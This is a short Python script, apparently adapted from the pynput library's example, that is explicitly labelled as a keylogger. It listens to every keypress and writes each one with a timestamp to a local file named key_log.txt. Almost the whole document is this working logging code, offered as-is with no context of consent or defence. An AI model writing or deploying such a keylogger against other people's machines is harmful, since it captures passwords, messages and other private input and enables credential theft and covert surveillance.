### From: https://github.com/moses-palmer/pynput
from pynput.keyboard import Key, Listener
import logging



###Keylogging part

log_dir = ""

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='["%(asctime)s", %(message)s]')

def on_press(key):
    logging.info('"{0}"'.format(key))

with Listener(on_press=on_press) as listener:
    listener.join()




